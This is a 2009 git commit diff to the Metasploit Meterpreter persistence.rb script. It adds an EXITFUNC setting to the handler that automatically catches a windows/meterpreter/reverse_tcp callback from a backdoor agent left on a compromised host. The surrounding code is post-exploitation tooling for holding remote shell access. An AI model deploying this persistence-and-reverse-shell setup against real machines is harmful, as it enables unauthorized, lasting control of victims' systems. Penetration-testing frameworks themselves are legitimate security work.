4657436e1d2eef67f126d157d73bff521f96361b
HD Moore <hd_moore@rapid7.com>
2009-12-09 00:18:43 +0000

    See #609. Force the EXITFUNC to process for persistence.rb's handler
    git-svn-id: file:///home/svn/framework3/trunk@7766 4d416f70-5f16-0410-b530-b9f4589650da

--- scripts/meterpreter/persistence.rb
+++ scripts/meterpreter/persistence.rb
@@ -87,9 +87,10 @@ print_status("Agent executed with PID #{proc.pid}")
 #
 if(autoconn)
 	mul = client.framework.exploits.create("multi/handler")
-	mul.datastore['PAYLOAD'] = "windows/meterpreter/reverse_tcp"
-	mul.datastore['LHOST']   = rhost
-	mul.datastore['LPORT']   = rport
+	mul.datastore['PAYLOAD']   = "windows/meterpreter/reverse_tcp"
+	mul.datastore['LHOST']     = rhost
+	mul.datastore['LPORT']     = rport
+	mul.datastore['EXITFUNC']  = 'process'
 	mul.datastore['ExitOnSession'] = false
 
 	mul.exploit_simple(
